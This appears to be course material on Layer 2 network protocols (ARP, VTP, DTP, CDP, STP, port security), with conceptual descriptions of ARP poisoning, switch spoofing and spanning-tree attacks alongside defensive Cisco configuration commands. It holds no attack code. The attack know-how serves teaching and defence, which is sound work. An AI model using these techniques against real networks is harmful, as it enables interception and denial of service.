ARP - A request and response in order to resolve the destination L2 (MAC) address when only the destination L3 (IPv4) address is known.

ARP Request:

ARP Request Operation code = 1
When a device needs to communicate with another device on the same network segment but only knows the destination's IP address, it broadcasts an ARP request message to the entire network.
The ARP request contains the sender's IP address and MAC address and the IP address of the target device.
ARP Reply:

ARP Reply Operation code = 2
The device with the IP address specified in the ARP request responds with an ARP reply.
The ARP reply contains the target device's MAC address.
Once the sender receives the ARP reply, it can use the MAC address to address frames destined for the target device.
RARP - A request and response in order to resolve the destination L3 (IPv4) address when only the destination L2 (MAC) is known. (This protocol has been deprecated since the widespread use of protocols like BOOTP and DHCP.)

RARP Request Operation code = 3
RARP Reply Operation code = 4
When a device boots up and has no configured IP address, it broadcasts a RARP request onto the local network.
The RARP request contains the device's MAC address.
RARP servers on the network receive the broadcast request and check their tables for a corresponding IP address entry associated with the MAC address.
Gratuitous ARP - An ARP reply that was not requested.

ARP Reply Operation code = 2
A gratuitous ARP messages is an ARP messages sent by a device to announce its own IP-to-MAC address mapping to other devices on the network.
Gratuitous ARP messages are commonly used during network initialization or to update ARP caches in other devices.
These are commonly used for:
Help in detecting IP conflicts
Assist in updating other system's ARP cache
To inform switches of the MAC address of the client connected to its port
Helps pre-load other systems ARP cache when the local systems IP interface comes up
Maliciously used to:
Poision a victim's ARP cache
Create a ARP MitM attack.
Proxy ARP - A device (router) answers the ARP queries for IP address that is on a different network.

The ARP proxy sees the ARP request and determines that the target Network address is not on the local network segment and is aware of how to reach the destination network.
The proxy will offer its own MAC address in response to the request.
Typically this device is the network gateway and is responsible to forward traffic for other networks.
Maliciously the ARP requests can be intercepted and a Proxy ARP sent as a response to poision the victim's ARP Cache.


ARP Cache - is a collection of Layer 2 to Layer 3 address mappings discovered utilizing the ARP request/response process.

When a host needs to send a packet both the L2 and L3 addresses are needed.
The host will look in this table to determine if it already knows both the L2 and L3 addresses.
If the target is not in the table then a ARP request is initiated.
The ARP cache can be populated statically but mostly its done dynamically.
This cache can be exploited by attackers with the aim to poison the cache with incorrect information to either perform a DoS or MitM.
To view the ARP Cache on a Windows or Linux computer:


arp -a
ip neighbor
NOTE: In Internet Protocol Version 6 (IPv6) networks, the functionality of ARP is provided by the Neighbor Discovery Protocol (NDP) and ARP is not used.



DEMO of ARP Pcap


DEMO of an ARP BROADCAST STORM


Resources


Instructor Note


1.3.9 Explain man-in-the-middle (MitM) with ARP¶
Using Gratuitous ARP:

When ARP was developed security was not as much of an issue. Over time it was discovered that many protocols could be used in unintended ways. Typically a host will broadcast an ARP request over the network and expects only the intended host to respond. Gratuitous ARP on the other hand is another method that a host can announce itself to the network. All other hosts believe the message and will add this entry into their ARP cache. These are the legitimate uses of ARP but malicious actors can use the open, unencrypted, and unverified nature of the protocol to their own ends.

An attacker can broadcast a gratuitous ARP, announcing itself as the networks default gateway. It will use the legitimate default gateway's IP address but will use it's own MAC address. All hosts on the network will assume this information to be true and update their ARP caches. This in essence will poison everyone's ARP cache. All hosts on the network will now send all traffic to other networks to the attackers computer. The Attacker will forward all traffic to the legitimate gateway but now the attacker is included in the hosts communication.

Gratuitous ARP Basics:

Definition: A Gratuitous ARP is an ARP message that is sent by a device without any prior request for it. This is usually done to announce or update the MAC address of a device on the network.
Purpose: Commonly used for updating the ARP cache of devices on the network when a device's IP-to-MAC mapping changes, or when a device comes online.
How the Attack Works:

Spoofing: An attacker sends out Gratuitous ARP messages with falsified IP-to-MAC mappings. For example, the attacker might send ARP messages claiming that their MAC address corresponds to the IP address of a legitimate device (such as the default gateway).
Network Impact: Devices on the network update their ARP tables with the incorrect information. This can cause the following issues:
Man-in-the-Middle Attack: The attacker can intercept and potentially alter traffic intended for the legitimate device.
Denial of Service (DoS): If the attacker sends ARP replies claiming to be the gateway, devices might be unable to reach the actual gateway, causing network disruptions.
Traffic Redirection: Traffic meant for the legitimate device is redirected to the attacker, potentially allowing for data sniffing or manipulation.




Using Proxy ARP:

Typically a PC will issue an ARP request to get the unknown MAC address of a device when its IP address is known. If the device is on the same network then that device will respond with ARP Reply. If the device happens to be on a different network, the router will respond with its own MAC address. The router responds because it will see that the destination IP address is on a different network and it knows how to get there from its routing tables. The router will respond to the ARP request with its own MAC to tell the host to send all the communication to itself to get to the remote destination. The host will update its ARP cache to reflect the router (default gateway) to be used to reach remote destinations. This is called a Proxy ARP.

Proxy ARP Basics:

Definition: Proxy ARP occurs when a device (the proxy) responds to ARP requests intended for a different device that is not on the same subnet, effectively allowing devices on one subnet to communicate with devices on another subnet as if they were on the same subnet.
Function: The proxy device sends an ARP reply for an IP address that is not within its own subnet. This allows the device requesting the ARP to think that the target IP is within its local network.
How the Attack Works:

Spoofing: An attacker can configure their device to act as a proxy for IP addresses that do not belong to their subnet. The attacker sends ARP replies claiming to be the gateway or another critical device.
Network Impact: Devices on the network may update their ARP tables with incorrect information, leading to various problems:
Man-in-the-Middle Attack: The attacker’s device can intercept, alter, or eavesdrop on traffic intended for the legitimate gateway or another device.
Traffic Redirection: Traffic that should go to the legitimate device is redirected to the attacker’s device.
Denial of Service (DoS): The attacker may disrupt network communication by causing devices to send traffic to the attacker’s device, making the legitimate device unreachable.




Mitigation Strategies:

Static ARP Entries

Implementation: Configure static ARP entries on critical devices like servers and network infrastructure devices (e.g., routers and switches).
Pros: Prevents ARP spoofing for static entries but can be cumbersome to manage in large networks.
Dynamic ARP Inspection (DAI)

Implementation: On managed switches, enable Dynamic ARP Inspection. DAI inspects ARP packets and verifies their validity against a trusted database (such as DHCP snooping bindings).
Pros: Provides real-time protection against ARP spoofing.
Use of Encryption

Implementation: Utilize encryption protocols like IPsec for securing traffic, making it harder for attackers to exploit ARP attacks.
Pros: Protects the data even if traffic is intercepted.
Monitoring and Detection

Implementation: Use network monitoring tools to detect abnormal ARP traffic or suspicious ARP packets.
Pros: Helps in identifying and responding to ARP attacks.
Port Security

Implementation: On network switches, configure port security features to limit the number of MAC addresses learned per port.
Pros: Reduces the impact of spoofed MAC addresses on individual ports.


Resources


Instructor Note


1.3.9.1 Demonstrate man-in-the-middle (MitM) with ARP¶
DEMO ARP MitM attack


Resources


Instructor Note


1.3.10 Explain VTP with its vulnerabilities¶


VLAN Trunking Protocol (VTP) is a Cisco proprietary protocol used to manage VLAN (Virtual Local Area Network) configurations across a network of switches. VTP simplifies VLAN management by allowing network administrators to make changes to VLAN configurations on one switch, and then automatically propagate these changes to all other switches in the same VTP domain. This ensures consistency and reduces the risk of configuration errors across multiple switches.

Key Concepts of VTP

VTP Domain

Definition: A VTP domain is a group of switches that share the same VTP configuration and VLAN information. All switches in the same VTP domain share VLAN information and synchronize their VLAN databases.
Configuration: Each switch must be configured with the same VTP domain name to participate in the same VTP domain.
VTP Modes

Server Mode:
Description: Switches in VTP Server mode can create, modify, and delete VLANs and share these VLAN configurations with other switches in the VTP domain. They also maintain a VLAN database that is synchronized with other switches.
Default Mode: Switches are in VTP Server mode by default.
Client Mode:
Description: Switches in VTP Client mode receive VLAN information from VTP Servers and apply these VLAN configurations, but they cannot create, modify, or delete VLANs. They rely on VTP Servers for their VLAN information.
Transparent Mode:
Description: Switches in VTP Transparent mode do not participate in VTP VLAN information exchange. They forward VTP advertisements but do not apply them or update their VLAN database based on VTP information. They maintain their own VLAN configurations and do not propagate changes to other switches.
Off Mode:
Description: In some contexts, "Off" mode may be used to disable VTP entirely on a switch. This mode is not a standard VTP mode but can be used to refer to a state where VTP is not active.
VTP Advertisements

Types:

Summary Advertisements: Contain information about the VTP domain name, revision number, and VLAN information.
Subset Advertisements: Carry VLAN configuration changes.
Advertisement Requests: Request VTP advertisements from other switches.
Purpose: Advertisements are used to propagate VLAN changes and maintain consistency across the VTP domain.

VTP Revision Number

Description: Each VTP advertisement includes a revision number that is incremented with each change to the VLAN configuration. Higher revision numbers indicate more recent configurations. Switches use the revision number to determine if they should update their VLAN database based on received advertisements.
There are three versions of VTP, version 1, version 2, version 3.



Resources


Instructor Note


1.3.10.1 VTP Issue¶
VTP Revision Number Attack

VTP uses the configuration revision number to determine what is the most "up-to-date" VLAN information. Each time the server makes an update it will send a VTP message with a higher revision number. The other switches will see that the message revision number is higher than what they have recorded so they will adopt the information in the message believing it to be more current.

The concern is that if you add a new switch to the current VTP domain that has a higher VTP revision number. This could be because it was previously on another VTP domain and was not properly erased. Once connected, that switch will not accept any VTP messages from the server since its revision number is higher. But when that switch sends its own VTP message advertising what it believes the current revision number is, all the other switches will see that it has a higher revision number and will cause all switches to dump all their information and request the information from the new switch. This in effect will bring down your entire VLAN infrastructure.

Additionally, an attacker can use this same process to perform a Denial of Service on your VTP-switched network. The attacker can craft their own VTP message and send it over the network. This will cause all the switches in the VTP domain to flush all their VLAN information. This however does not change the VLANs assigned to the ports. The ports will stay assigned to the programmed VLANs. The switch however will no longer be forwarding traffic for those VLANS so the hosts will be isolated until the VLANs are re-introduced to the switch.



Resources


Instructor Note


1.3.11 Explain DTP with its vulnerabilities¶


Dynamic Trunking Protocol (DTP) is a Cisco proprietary protocol used to negotiate trunk links between switches. DTP allows switches to automatically form trunk links by negotiating the type of trunking encapsulation (such as 802.1Q) and whether the link should be a trunk or access port. While DTP simplifies network configuration, it also introduces several vulnerabilities that can be exploited in various types of attacks.

Most switches will have DTP enabled by default in either "Dynamic-Auto" or "Dynamic-Desirable" modes.



Resources


Instructor Note


1.3.11.1 DTP Attack (Switch Spoofing)¶
A DTP attack occurs when an attacker manipulates the DTP protocol to gain unauthorized access to network segments, escalate privileges, or disrupt network operations. This often involves tricking switches into forming trunk links where they shouldn’t, leading to unintended VLAN access or network vulnerabilities.

DTP attacks relate to the VLAN hopping attack discussed earlier. Attackers can craft their own DTP frames in order to negotiate a trunk link between their device and the switchport. This trunking connection would allow the attacker to communicate with all VLANs on the switch and to inject traffic into whatever VLAN they desire. Typically the trunk link will not be "pruned" or allowed VLANs specified so this connection will allow the attacker access to all VLANs on that switch. This attack is sometimes called "Switch Spoofing".

This attack can be mitigated by using the switchport nonegotiate interface command to disable DTP. Additionally you should manually assign switchports to either Access (switchport mode access) or Trunk (switchport mode trunk).

Mitigation Strategies
Disable DTP on Switch Ports
switchport nonegotiate
Configure switch ports to explicitly use either access or trunk mode, and disable DTP negotiation on ports where trunking is not required.
switchport mode access or switchport mode trunk


Resources


Instructor Note


1.3.12 Explain CDP, FDP and LLDP and the security vulnerabilities¶
Cisco Discovery Protocol (CDP) is a Layer 2, Cisco proprietary protocol used to share information with other directly connected Cisco devices. CDP is protocol and media independent and runs on all Cisco routers, switches, and other devices.

CDP Shares information such as:

Device ID (hostname)
IP address
Port ID (interface on the device)
Platform (device model)
Capabilities (e.g., router, switch)
Number and type of interface
IOS software version
CDP can be used as a Network Discovery tool as well as assist in network design decisions and troubleshooting.

Foundry Discovery Protocol (FDP) is a proprietary data link layer protocol, originally developed by Foundry Networks, which was bought by Brocade. Similar to CDP, FDP enables Brocade devices to advertise to other directly connect Brocade devices on the network.

Link Layer Discovery Protocol (LLDP) was designed by IEEE 802.1AB to be a vendor-neutral neighbor discovery protocol similar to CDP. LLDP also operates at layer 2 and shares similar information as does CDP with directly connected devices that support LLDP.



DEMO of CDP and LLDP


Resources


Instructor Note


1.3.12.1 Cisco Discovery Protocol (CDP) Attack¶
Due to the nature of how CDP works, it can be easily used by malicious actors to map out your network infrastructure. It also shares alot of device information that an attacker can use in preparation of an attack; information like IP addresses, router models, software versions and so on can be sensitive for your organization. All information is sent in clear text and unauthenticated. Any attacker sniffing the network is able to see this information and is possible to impersonate (spoof) another device.

It is recommended to disable CDP/LLDP if not needed in your organization. It is however required for many VOIP phones to operate. Cisco VOIP send CDP messages to the switch. This is how switches know to place the phones on the "voice" vlan and not the "data" vlan.

Disable Globally with no cdp run
Disable on an interface with no cdp enable


Resources


Instructor Note


1.3.13 Explain STP with its vulnerabilities¶


We previously mentioned that there is no TTL at Layer 2 to eventually kill a frame that never reaches its destination. This will result in frames endlessly circulating a L2 infrastructure and eventually bringing down the network. This can be caused by simply adding redundant links in your network architecture that could allow frames to potentially circulate.

Spanning Tree Protocol (STP) (802.1D) was developed to resolve this issue. STP is a Layer 2 protocol that builds a loop-free logical topology for Ethernet networks in a network that physically has loops. The basic function of STP is to prevent switching loops and the broadcast storms that can result. Spanning tree allows a network design to include physical "backup links" to provide fault tolerance if the active link fails.

STP works by creating "tree" within a network of connected layer-2 switches, and disable any links that are not part of this tree. The root of the tree determined by electing a Root Bridge and all the other switches are the branches. This essentially leaves only a single active path between any two network switches. STP is based on the algorithm invented by Radia Perlman.

STP operates by flooding Bridge Protocol Data Units (BPDUs) to all other switches in the network. BPDUs consist of:

Switches priority value (default 32768. Lower numbers are preferred.)
MAC address (lowest one on the switch. Lower MAC address are preferred.)
These BPDUs are used to:

Elect the Root Bridge
Identify the Root port on each non-root bridge
Identify the Designated port for each segment
After the election of the Root Bridge, all BPDUs will come from the root only and each switch will forward these BPDUs out their Trunk ports. This ensures that all switches know that the root is still active.

IEEE introduced Rapid Spanning Tree Protocol (RSTP) as 802.1w in 2001. RSTP allowed ports to transition from blocking to forwarding in about 10 seconds.

In 2005, the IEEE introduced 802.1s, alternatively referred to as Multiple Spanning Tree Protocol (MSTP), extending the foundational Spanning Tree Protocol (STP) delineated by IEEE 802.1D. MSTP enriches STP by enabling the mapping of multiple VLANs to a solitary spanning tree instance, thereby aiding in the optimization of network assets and the acceleration of convergence time.

Versions of Spanning Tree Protocol (STP)

Open Standards-Based Versions:

STP (802.1D):

Open standard defined by the IEEE 802.1D specification.
Basic version of the Spanning Tree Protocol, widely supported by networking equipment from various vendors.
Defines the original spanning tree algorithm for loop prevention in Ethernet networks.
Convergence Time: 30 to 50 seconds.
RSTP (802.1w):

Open standard defined by the IEEE 802.1w specification.
Improves upon the original STP by providing faster convergence and better performance.
Offers faster link failover times and better utilization of redundant links compared to STP.
Widely supported across networking equipment from multiple vendors.
Convergence Time: 6 seconds or less.
MSTP (802.1s):

Open standard defined by the IEEE 802.1s specification.
Extends RSTP to support multiple spanning tree instances, each of which can encompass multiple VLANs.
Helps reduce the number of spanning tree instances needed in large networks with multiple VLANs, improving scalability and manageability.
Convergence Time: Similar to RSTP (6 seconds or less).
Cisco Proprietary Versions:

Per-VLAN Spanning Tree (PVST) and PVST+ (Per-VLAN Spanning Tree Plus):

Proprietary spanning tree protocol developed by Cisco.
PVST and PVST+ extend the functionality of STP by creating a separate spanning tree instance for each VLAN.
Allows for finer control over spanning tree behavior on a per-VLAN basis, optimizing network performance and stability.
Convergence Time: Typically similar to STP (30 to 50 seconds).
Rapid Per-VLAN Spanning Tree (Rapid PVST):

Cisco's proprietary version of RSTP, tailored for use with PVST+.
Offers faster convergence and better performance compared to traditional PVST+.
Provides rapid failover times for individual VLANs, enhancing network resilience and uptime.
Convergence Time: Typically similar to RSTP (6 seconds or less).
Cisco Multiple Spanning Tree Protocol (MSTP)

Cisco offers its implementation of MSTP, which is compatible with the IEEE 802.1s standard.
Allows Cisco devices to participate in MSTP environments alongside equipment from other vendors.
Offers enhanced features and integration with other Cisco networking technologies.
Convergence Time: Typically similar to RSTP (6 seconds or less).


DEMO PVST+


Resources


Instructor Note


1.3.13.1 STP Bridge Protocol Data Units (BPDU)¶
Spanning Tree Protocol (STP) uses Bridge Protocol Data Units (BPDUs) to exchange information between switches and determine the topology of the network. BPDUs contain vital information necessary for STP operation, including bridge IDs, port IDs, path costs, and other parameters.

Contents of a BPDU:

Bridge ID (BID):

The BID uniquely identifies each bridge (switch) in the network and consists of two components: bridge priority and bridge MAC address.
The bridge priority is a numerical value (default is 32768) used to determine the root bridge.
The bridge MAC address is the MAC address of the bridge.
Port ID:

The Port ID uniquely identifies each port on a bridge.
It consists of two components: port priority and port number.
The port priority is a numerical value (default is 128) used to determine the designated port.
The port number is the identifier of the port on the bridge.
Path Cost:

The path cost represents the cumulative cost of the path from the sending bridge to the root bridge.
Each port calculates its path cost based on the speed of the link. For example, a higher speed link (e.g., Gigabit Ethernet) has a lower path cost than a lower speed link (e.g., Fast Ethernet).
Root Bridge ID:

The Root Bridge ID (RID) is the bridge ID of the root bridge, which is initially set to the bridge ID of the sending bridge.
As BPDUs propagate through the network, switches update the RID in the received BPDUs to reflect the bridge ID of the root bridge.
Message Type:

BPDUs can be either Configuration BPDUs or Topology Change Notification (TCN) BPDUs.
Configuration BPDUs are used for regular STP operations, such as root bridge election, topology discovery, and path selection.
TCN BPDUs are used to notify other switches of changes in the network topology, such as link failures or port state changes.
BPDU Exchange Process:

Transmission:

Each switch sends BPDUs out of all its designated ports at regular intervals (hello time), usually every 2 seconds by default.
BPDUs are sent as multicast frames to the well-known address 01:80:C2:00:00:00.
Reception:

Switches receive BPDUs from neighboring switches on their designated ports.
Upon receiving a BPDU, a switch compares the information in the BPDU with its own information to determine the best path to the root bridge.
Processing:

Switches process incoming BPDUs to update their internal spanning tree information, including root bridge selection, port roles (root, designated, or blocked), and path costs.
After the root bridge election, only the root will transmit BPDUs and non-root switches will process the BPDUs sent by the root.
Decision Making:

Based on the information in received BPDUs, switches make decisions about the state of their ports (forwarding, blocking, or listening/learning) and adjust their forwarding tables accordingly.
Switches use BPDUs to decide the root bridge in a STP environment. They determine the root as the one with the lowest priority. If there is a tie for priority then the lowest MAC address is used.


Resources


Instructor Note


1.3.13.2 Spanning-Tree Attack¶
Bridge Protocol Data Unit (BPDU) Flooding

Description: An attacker floods the network with BPDUs (STP control messages) to overwhelm the network’s STP process. This can lead to instability and network loops. ** Impact: The network can become unstable, with frequent topology changes and potential network outages.

Its goal is to disrupt the switch's spanning-tree process, destabilize their CAM tables and hold the network in a repetitive state of re-electing the root bridge. This is possible because there is no authentication mechanism built into the STP and its BPDU frames.

This is done by repeatedly sending (crafted) Topology Change Notification (TCN) messages that will disrupt the system’s current understanding of the network. This will force renegotiation of the Root Bridge, resulting in a DoS attack because of the 50 second time period it takes to recalculate.

STP Manipulation (Root Bridge Attack)

Description: An attacker sends forged STP configuration messages to make their switch appear as the Root Bridge. This can cause legitimate switches to reroute traffic through the attacker’s switch.
Impact: Traffic is rerouted through the attacker’s switch, potentially leading to traffic interception, network congestion, or denial of service.
Another option is for the attacker to try to become the root bridge. Depending on the location of the attacker's system, this can have a dramatic effect on the traffic flow throughout the L2 network. This can potentially cause traffic to traverse towards or thru the attacker's device.
This attack can be done by sending specially crafted BPDUs by giving itself a more preferred BPDU. Typically specifying a lower priority value. Once this is accomplished it is possible for the attacker to see packets that are sent through them. This requires the attacker to stay connected to two switches, running bridging software, so that they can continue to send the BPDU to advertise themselves as the root bridge.
Both attacks require that the attacker be physically connected to the network.

The industry standard of 802.1D there is only 1 spanning tree instance no matter how many vlans are running on the network. So to attack STP will affect every vlan in the network. However Cisco's proprietary STP called PVST and PVST+, there is a spanning tree instance for each vlan in the network. So to attack one will not affect the others. Each vlan spanning tree instance would need to be attacked for a full network DoS.

To mitigate STP attack you can:

Enable portfast to have a port immediately come up to the forwarding state.

Globally by using spanning-tree portfast default
By interface using spanning-tree portfast
Enable BPDU guard to prevent BPDUs from beign allowed on a switchport.

On each access port interface use spanning-tree bpduguard enable
Must not use this command on any trunk or switch to switch connections.


Resources


Instructor Note


1.3.13.3 Without Spanning-Tree¶


Without Spanning Tree Protocol (STP), Ethernet networks would be susceptible to network loops and broadcast storms, which can lead to severe network performance degradation and outages. STP is designed to prevent these issues by ensuring there are no loops in the network topology. If STP is not used or is improperly configured, alternative methods and technologies must be employed to manage network topology and ensure reliability.

Problems Without Spanning Tree Protocol

Network Loops:

Without STP, redundant links in a network can create loops. When a frame is broadcasted, it can circulate endlessly through the network, causing multiple copies of the same frame to flood the network.
Ethernet frames do not have a time to live (TTL) field as the IPv4 and IPv6 packet headers do. Because of this there is no mechanism to block continued propagation of frames on a Layer 2 switched network.
Broadcast Storms:

Loops cause broadcast storms, where broadcast frames are endlessly replicated, overwhelming network resources and leading to degraded performance or outages.
MAC Table Instability:

Switches use MAC address tables to forward frames efficiently. In the presence of loops, these tables can become unstable as frames are received from multiple ports, leading to incorrect frame forwarding.


Many networks today can operate without using STP with careful planning. It is possible to provide redundancy without needing to create a series of redundant links.

Network Design Principles:

Hierarchical Network Design: Implement a hierarchical network design with clearly defined layers (Access, Distribution, and Core) to minimize the complexity and potential for loops.
Redundancy Planning: Plan network redundancy carefully to avoid unnecessary loops and ensure proper failover mechanisms.
EtherChannel (Link Aggregation):

Description: EtherChannel (or IEEE 802.3ad Link Aggregation Control Protocol, LACP) allows multiple physical links to be combined into a single logical link, providing redundancy and increased bandwidth.
Implementation: Use EtherChannel to aggregate links between switches, ensuring that all links are part of the same logical group and avoiding loops.
Routing Protocols:

Layer 3 Routing: Use Layer 3 routing protocols (e.g., OSPF, EIGRP, BGP) instead of relying on Layer 2 switching. Routing protocols prevent loops by managing traffic between different network segments and avoiding broadcast domains.
Implementation: Configure routers and Layer 3 switches to handle inter-VLAN routing and segment the network into distinct routing domains.
Virtual LANs (VLANs):

Description: VLANs logically segment the network into separate broadcast domains. This reduces the impact of broadcast storms and simplifies network management.
Implementation: Assign different VLANs to different network segments and configure inter-VLAN routing using Layer 3 devices.
Rapid Spanning Tree Protocol (RSTP):

Description: RSTP (IEEE 802.1w) is an evolution of STP that provides faster convergence times and improved efficiency while maintaining loop prevention.
Implementation: Replace traditional STP with RSTP for better performance and quicker recovery from network changes.
Multiple Spanning Tree Protocol (MSTP):

Description: MSTP (IEEE 802.1s) allows multiple spanning trees to be created, each corresponding to different VLANs. This optimizes network performance by allowing load balancing and reducing redundant traffic.
Implementation: Use MSTP to map VLANs to different spanning tree instances, enhancing network efficiency.
Other Loop Prevention Technologies:

TRILL (Transparent Interconnection of Lots of Links): A protocol designed to replace STP in large networks, providing loop-free forwarding and supporting multiple active paths.
SPB (Shortest Path Bridging): A protocol that provides efficient and loop-free network topology by using a link-state routing approach for Ethernet frames.
Network Segmentation and Isolation:

Segmentation: Use physical or logical segmentation to isolate different parts of the network and limit the scope of potential loops.
Implementation: Implement network segmentation through VLANs, firewalls, or separate network devices to control traffic flow and prevent loops.


Issues in a switched network

In a switched network with physical loops, Spanning-Tree is crucial or else your whole network can be brought down with broadcasts. Without any configured physical loops in your network, spanning-tree can be safely disabled to conserve a little bandwidth and CPU processing of the BPDU messages. However, if a redundant link were to ever be connected the network will quickly shutdown.



Resources


Instructor Note


1.3.14 Explain Port Security with its vulnerabilities¶
Port Security

The purpose of configuring port security technologies is to limit, restrict, and protect network access. Configuring port security can be done on active access ports to limit the number of users or MAC addresses allowed to access onto the network. This will help to alleviate attacks such as DoS, MAC Address Flooding, and most unauthorized access.

MAC Address Limit:

Port security allows administrators to specify the maximum number of MAC addresses allowed on a switch port.
When enabled, the switch monitors the MAC addresses of devices connected to the port and takes action if the number of MAC addresses exceeds the configured limit.
MAC Address Learning:

When a device sends traffic through a switch port, the switch learns the device's MAC address and associates it with the port.
The switch maintains a table, known as the MAC address table or CAM table, which maps MAC addresses to switch ports.
Violation Actions:

Administrators can define violation actions to be taken when port security violations occur.
Common violation actions include shutting down the port, sending an SNMP trap, or logging a message.
These actions help alert administrators to potential security breaches and mitigate unauthorized access attempts.
The following are the possible modes:
protect - Drops any frames with an unknown source addresses.
restrict - Same as protect except it additionally creates a violation counter report.
shutdown - Places the interface into an "error-disabled" state immediately and sends an SNMP trap notification. This is typically the default mode.


Clearing Port Security Violations


Port security's effectiveness has seemingly diminished over the years. In the past the MAC address were "burned-in" or set in the firmware of the NIC and could not be changed. Today this is managed in software and can easily be changed. Port Security is still an effective tool in the Defense-in-Depth strategy.

Port security can still help to:

Protect against CAM Table Overflow attack. This is were an attacker can flood a switch with hundreds of bogus MAC addresses in effort to fill its CAM tables. Once full, the switch will operate much like a Layer 1 Hub.
Restrict the possible allowed MAC addresses to a port to (1).


switchport port-security
switchport port-security maximum 1


Resources


Instructor Note


1.3.15 Layer 2 Attack mitigation techniques¶
The following are some mechanisms that can be be configured to better secure your switched network:

Shutdown unused ports - Bare minimum to secure access ports is to simply shut down any and all inactive ports.


interface fastethernet 0/1
shutdown
Switchport Port Security - Can be used to limit the number of MAC addresses that can be dynamically learned on a port or static MAC addresses can be assigned to one. Violation modes of shut down can be used to secure the port should a violation occur.


switchport port-security
switchport port-security maximum 1
switchport port-security mac-address sticky
switchport port-security violation shutdown
IP Source Guard - Mitigates the effects of IP address spoofing attacks on the Ethernet LAN. With IP source guard enabled, the source IP address in the packet sent from an untrusted access interface is validated against the DHCP snooping database. If the packet cannot be validated, it is discarded.


interface fastethernet 0/1
ip verify source
ip source binding 0100.0230.0002 vlan 11 10.10.0.40 interface fastethernet 0/1
Manually assign STP Root - Manually assign the Spanning Tree Protocol (STP) root bridge allows for a deterministic root bridge election rather than the bridge with the lowest bridge priority. This allows the central most switch to be the root that will best allow traffic to flow in an efficent manner.


spanning-tree vlan <vlan-id> priority 0
BPDU Guard - BPDU Guard is a feature used in network switches to enhance network security by protecting against unintentional loops and rogue devices. It works by automatically shutting down a port if it receives Bridge Protocol Data Units (BPDUs), which are indicative of spanning tree protocol (STP) activity.


interface fastethernet 0/1
spanning-tree bpduguard enable
DHCP Snooping - DHCP Snooping is a security feature commonly found in network switches that helps prevent rogue or unauthorized DHCP servers from distributing incorrect or malicious IP configuration information to network clients. It operates by monitoring and controlling DHCP messages exchanged between DHCP clients and servers. Configuration is done on ports that are connected to (or leading to) the DHCP server.


ip dhcp snooping
interface fastethernet 0/1
ip dhcp snooping trust
ip dhcp snooping vlan <vlan-id>
802.1x - The 802.1x standard defines a client-server-based access control and authentication protocol that prevents unauthorized clients from connecting to a LAN through ports until they are properly authenticated. The authentication server authenticates each client connected to a switchport before making available any services offered by the switch or the LAN.


aaa new-model
aaa authentication dot1x default group radius
dot1x system-auth-control
identity profile default

interface fastethernet 0/1
access-session port-control auto
dot1x pae authenticator
Dynamic ARP inspection (DAI) - Prevents Address Resolution Protocol (ARP) spoofing or “man-in-the-middle” attacks. ARP requests and replies are compared against entries in the DHCP snooping database, and filtering decisions are made on the basis of the results of those comparisons.


ip arp inspection vlan {vlan-id> | <vlan-range>}

interface fastethernet 0/1
ip arp inspection [ trust | untrust ]

ip arp inspecion filter <arp-acl-name> vlan {vlan-id> | <vlan-range>} [static]
Static CAM entries - Static CAM (Content Addressable Memory) entries refer to manually configured entries in the CAM table of Ethernet switches. These entries map specific MAC addresses to specific switch ports and are used to optimize network performance and facilitate specific network configurations.


mac-address-table static 1234:abcd:5678 vlan 1 interface fastethernet 0/1
Static ARP entries - Static ARP (Address Resolution Protocol) entries are manually configured mappings between IP addresses and MAC addresses in the ARP table of network devices. These entries are used to ensure stable communication between specific devices on the network.

Linux:


sudo ip neighbor add 10.10.0.50 lladdr 11:22:33:44:55:66 nud permanent dev eth0
sudo ip neighbor delete 10.10.0.50 lladdr 11:22:33:44:55:66 nud permanent dev eth0
Windows:


arp -s 10.10.0.50 11:22:33:44:55:66
Disable DTP negotiations - To disable Dynamic Trunking Protocol (DTP) negotiations on a Cisco switch interface, you need to manually configure the interface as an access port or set it to operate in a specific trunking mode, such as "trunk" or "nonegotiate."


interface fastethernet 0/1
switchport mode trunk
switchport nonegotiate

interface fastethernet 0/2
switchport mode access
switchport nonegotiate
Manually assign Access/Trunk ports - By default, switch ports can be either a trunk or access port depending on the device connected to the port and dynamic negotiations that take place. Manually assigning ports as either trunk or access ports provides greater control and ensures that the network operates as intended.


interface fastethernet 0/1
switchport mode trunk
switchport nonegotiate

interface fastethernet 0/2
switchport mode access
switchport nonegotiate

Network Layer¶
Lesson Number: 112-CCTC15

Slides¶
Network Layer Slides
2.0 Outcomes¶
Explain OSI Layer 3 protocols, headers and technologies
Describe IP networking
Explain IPv4 Addressing
Describe Classful IPv4 addressing and subnetting
Analyze IPv4 packet header
Identify IPv4 address types and scopes
Explain Fragmentation with its vulnerability
Explain OS Fingerprinting with TTL
Explain IPv4 Auto Configuration with vulnerability
Analyze ICMPv4 protocol and header structure
Explain IPv6 Addressing
Describe IPv6 addressing and subnetting
Analyze IPv6 packet header
Describe key differences between IPv4 and IPv6
Explain IPv6 address representation
Identify IPv6 address types and scopes
Explain IPv6 Auto Configuration with vulnerability
Analyze ICMPv6 protocol and header structure
Explain Neighbor discovery protocol (NDP)
Analyze internetworking routing
Discuss Routing Tables
Dynamic Routing Protocols operation and vulnerabilities
Compare Static routing vs. dynamic routing
Understand First Hop Redundancy Protocols and their vulnerabilities
Layer 3 (Network layer) protocols are vital in cybersecurity as they enable end-to-end communication and routing of data across networks. Protocols like IP (Internet Protocol) manage logical addressing and packet routing between different network segments. Understanding Layer 3 protocols is essential for traffic management, access control, and protecting against cyber threats.

At Layer 3, IP addresses allow devices on separate networks to communicate, while protocols like OSPF and BGP aid in routing. Cybersecurity professionals must understand IP addressing, subnetting, and routing to design secure network architectures. Layer 3 also supports network segmentation and access control, preventing unauthorized access and limiting the spread of cyber threats.

Layer 3 protocols enable security features like VPNs (using IPsec for secure communication over untrusted networks) and NAT (hiding internal IP addresses for added security). In summary, mastering Layer 3 protocols is crucial for establishing secure communication, enforcing access controls, and protecting networks from cyber threats.



Resources


Instructor Note


2.1 Describe IP Networking¶
Network Layer

Internetworking was developed because Local Area Networks (LAN) needed the ability to communicate with one another. ARPANet was the first network created to address this need in the 1960's, this has evolved into the Internet Protocol (IP). The network layer of the OSI model is where this layer of internetworking is discussed and its parameters are defined. The protocol data unit at this layer is considered a packet and is the last structure generated before the data is encapsulated into a frame at the data-link layer. There are two different versions of IP, version 4 and version 6. The network layer is an extremely important layer in the OSI model that facilitates network to network communications and provides the following:

Addressing Schemes for Network (Logical Addressing)

Each device on the network has a logical addresses associated with it. This address is independent of the hardware device and must be unique in an internetwork.
Routing

